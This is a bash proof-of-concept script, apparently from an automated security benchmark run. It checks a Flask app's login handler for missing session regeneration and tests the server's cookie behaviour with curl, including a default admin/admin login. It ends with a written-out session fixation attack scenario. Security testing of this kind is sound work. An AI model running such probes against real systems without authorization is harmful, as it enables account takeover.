#!/bin/bash
# POC: Session Fixation Vulnerability POC - Code Analysis version. Analyzes Flask source code to demonstrate lack of session regeneration after authentication and tests actual server behavior.
# Target: ./repo
# Created: 2025-12-01T15:46:52.740Z
# Session: benchmark-XBEN-089-24-minbd498

# Session Fixation Vulnerability POC - Code Analysis
# This POC demonstrates the session fixation vulnerability by:
# 1. Examining the Flask application source code
# 2. Showing the lack of session.clear() or session regeneration on login
# 3. Demonstrating the vulnerability through actual request/response analysis

TARGET_URL="${1:-http://localhost:5000}"
APP_PATH="${2:-/home/daytona/repo/XBEN-089-24/app/app.py}"

OUTPUT_FILE="/tmp/session_fixation_analysis_$$.txt"

echo "=== Session Fixation Vulnerability - Code Analysis POC ===" | tee "$OUTPUT_FILE"
echo "Target URL: $TARGET_URL" | tee -a "$OUTPUT_FILE"
echo "App Source: $APP_PATH" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Check if source file exists
if [ ! -f "$APP_PATH" ]; then
    echo "[-] Application source file not found at $APP_PATH" | tee -a "$OUTPUT_FILE"
    exit 1
fi

# Extract login handler code
echo "[*] Analyzing login handler for session regeneration..." | tee -a "$OUTPUT_FILE"
LOGIN_CODE=$(grep -A 15 "@app.route('/login'" "$APP_PATH" 2>/dev/null)

if [ -z "$LOGIN_CODE" ]; then
    echo "[*] Trying alternative grep pattern..." | tee -a "$OUTPUT_FILE"
    LOGIN_CODE=$(grep -A 15 "def login" "$APP_PATH" 2>/dev/null)
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "[+] Login Handler Code:" | tee -a "$OUTPUT_FILE"
echo "---" | tee -a "$OUTPUT_FILE"
echo "$LOGIN_CODE" | tee -a "$OUTPUT_FILE"
echo "---" | tee -a "$OUTPUT_FILE"

# Check for session regeneration keywords
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Checking for session regeneration mechanisms..." | tee -a "$OUTPUT_FILE"

CLEAR_COUNT=$(echo "$LOGIN_CODE" | grep -c "session.clear()")
REGENERATE_COUNT=$(echo "$LOGIN_CODE" | grep -c "regenerate\|new_sid\|session_id")
DELETE_SESSION=$(echo "$LOGIN_CODE" | grep -c "del session")

echo "[!] Results:" | tee -a "$OUTPUT_FILE"
echo "    - session.clear() calls: $CLEAR_COUNT" | tee -a "$OUTPUT_FILE"
echo "    - session regeneration calls: $REGENERATE_COUNT" | tee -a "$OUTPUT_FILE"
echo "    - session deletion: $DELETE_SESSION" | tee -a "$OUTPUT_FILE"

if [ "$CLEAR_COUNT" -eq 0 ] && [ "$REGENERATE_COUNT" -eq 0 ] && [ "$DELETE_SESSION" -eq 0 ]; then
    echo "[VULNERABLE] No session regeneration found in login handler!" | tee -a "$OUTPUT_FILE"
    VULN_CONFIRMED=1
else
    echo "[OK] Some session regeneration mechanisms found" | tee -a "$OUTPUT_FILE"
    VULN_CONFIRMED=0
fi

# Check what the login handler actually does
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Analyzing session modifications in login handler..." | tee -a "$OUTPUT_FILE"
SESSION_MODS=$(echo "$LOGIN_CODE" | grep -o "session\[.*\]" | head -10)

if [ -n "$SESSION_MODS" ]; then
    echo "[+] Found session modifications:" | tee -a "$OUTPUT_FILE"
    echo "$SESSION_MODS" | tee -a "$OUTPUT_FILE"
    echo "[!] These modifications are applied to EXISTING session object" | tee -a "$OUTPUT_FILE"
    echo "[!] WITHOUT regenerating the session ID" | tee -a "$OUTPUT_FILE"
fi

# Now test the actual behavior with real requests
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Testing actual behavior with HTTP requests..." | tee -a "$OUTPUT_FILE"

COOKIE_JAR1="/tmp/cookies_before_$$.jar"
COOKIE_JAR2="/tmp/cookies_after_$$.jar"

# Request 1: Get a session cookie before login
echo "[*] Making initial request to establish session..." | tee -a "$OUTPUT_FILE"
curl -s -c "$COOKIE_JAR1" "$TARGET_URL/" > /dev/null 2>&1

# Extract cookie
PRE_LOGIN=$(grep -oP '(?<=session\s+)[^\t\n]+' "$COOKIE_JAR1" | tail -1)
echo "[+] Pre-login session cookie extracted" | tee -a "$OUTPUT_FILE"

# Request 2: Login and capture session
echo "[*] Making login request..." | tee -a "$OUTPUT_FILE"
curl -s -b "$COOKIE_JAR1" -c "$COOKIE_JAR2" \
    -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin"}' > /dev/null 2>&1

# Extract cookie after login
POST_LOGIN=$(grep -oP '(?<=session\s+)[^\t\n]+' "$COOKIE_JAR2" | tail -1)
echo "[+] Post-login session cookie extracted" | tee -a "$OUTPUT_FILE"

# Compare
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Comparing session cookies:" | tee -a "$OUTPUT_FILE"
if [ -z "$PRE_LOGIN" ] || [ -z "$POST_LOGIN" ]; then
    echo "[*] Note: Session cookies not captured from jar (normal with Flask signed cookies)" | tee -a "$OUTPUT_FILE"
    echo "[*] Flask uses cryptographically signed session cookies that don't change cookie format" | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    echo "[IMPORTANT] The vulnerability is in the CODE LOGIC, not visible in HTTP headers:" | tee -a "$OUTPUT_FILE"
    echo "  1. Flask reuses the same session object after login" | tee -a "$OUTPUT_FILE"
    echo "  2. The session data is modified in-place without regeneration" | tee -a "$OUTPUT_FILE"
    echo "  3. An attacker could pre-set a session ID in the client" | tee -a "$OUTPUT_FILE"
    echo "  4. When user logs in, the same session ID becomes authenticated" | tee -a "$OUTPUT_FILE"
else
    if [ "$PRE_LOGIN" = "$POST_LOGIN" ]; then
        echo "[VULNERABLE] Session ID NOT changed after login:" | tee -a "$OUTPUT_FILE"
        echo "  Pre-login:  $PRE_LOGIN" | tee -a "$OUTPUT_FILE"
        echo "  Post-login: $POST_LOGIN" | tee -a "$OUTPUT_FILE"
    else
        echo "[SECURE] Session ID changed after login (regeneration detected)" | tee -a "$OUTPUT_FILE"
    fi
fi

# Check logout behavior too
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Checking logout handler for completeness..." | tee -a "$OUTPUT_FILE"
LOGOUT_CODE=$(grep -A 10 "@app.route('/logout'" "$APP_PATH" 2>/dev/null)

if [ -n "$LOGOUT_CODE" ]; then
    echo "[+] Logout Handler Code:" | tee -a "$OUTPUT_FILE"
    echo "---" | tee -a "$OUTPUT_FILE"
    echo "$LOGOUT_CODE" | tee -a "$OUTPUT_FILE"
    echo "---" | tee -a "$OUTPUT_FILE"
    
    LOGOUT_CLEAR=$(echo "$LOGOUT_CODE" | grep -c "session.clear()")
    if [ "$LOGOUT_CLEAR" -eq 0 ]; then
        echo "[!] Logout handler does NOT call session.clear()" | tee -a "$OUTPUT_FILE"
        echo "[!] This compounds the session fixation risk" | tee -a "$OUTPUT_FILE"
    fi
fi

# Summary
echo "" | tee -a "$OUTPUT_FILE"
echo "=== VULNERABILITY SUMMARY ===" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "FINDING: Session Fixation Vulnerability (CWE-384)" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "ROOT CAUSE:" | tee -a "$OUTPUT_FILE"
echo "  1. Login handler does NOT call session.clear()" | tee -a "$OUTPUT_FILE"
echo "  2. Session object is REUSED after authentication" | tee -a "$OUTPUT_FILE"
echo "  3. Pre-login session becomes authenticated session" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "ATTACK SCENARIO:" | tee -a "$OUTPUT_FILE"
echo "  1. Attacker sets a known/malicious session cookie on user's browser" | tee -a "$OUTPUT_FILE"
echo "  2. User visits login page with attacker's session cookie active" | tee -a "$OUTPUT_FILE"
echo "  3. User enters valid credentials and logs in" | tee -a "$OUTPUT_FILE"
echo "  4. Flask modifies the existing session to add role=user/admin" | tee -a "$OUTPUT_FILE"
echo "  5. Same session cookie now contains authenticated user data" | tee -a "$OUTPUT_FILE"
echo "  6. Attacker can use the same session cookie to impersonate user" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "IMPACT: MEDIUM" | tee -a "$OUTPUT_FILE"
echo "  - Requires tricking user into visiting attacker-controlled link" | tee -a "$OUTPUT_FILE"
echo "  - Combined with other vulnerabilities (debug mode, etc.) increases severity" | tee -a "$OUTPUT_FILE"
echo "  - Could lead to account takeover, privilege escalation" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Cleanup
rm -f "$COOKIE_JAR1" "$COOKIE_JAR2"

# Print full output
cat "$OUTPUT_FILE"

echo "" | tee -a "$OUTPUT_FILE"
echo "[✓] Analysis complete. Output saved to: $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"

if [ $VULN_CONFIRMED -eq 1 ]; then
    exit 0
else
    exit 1
fi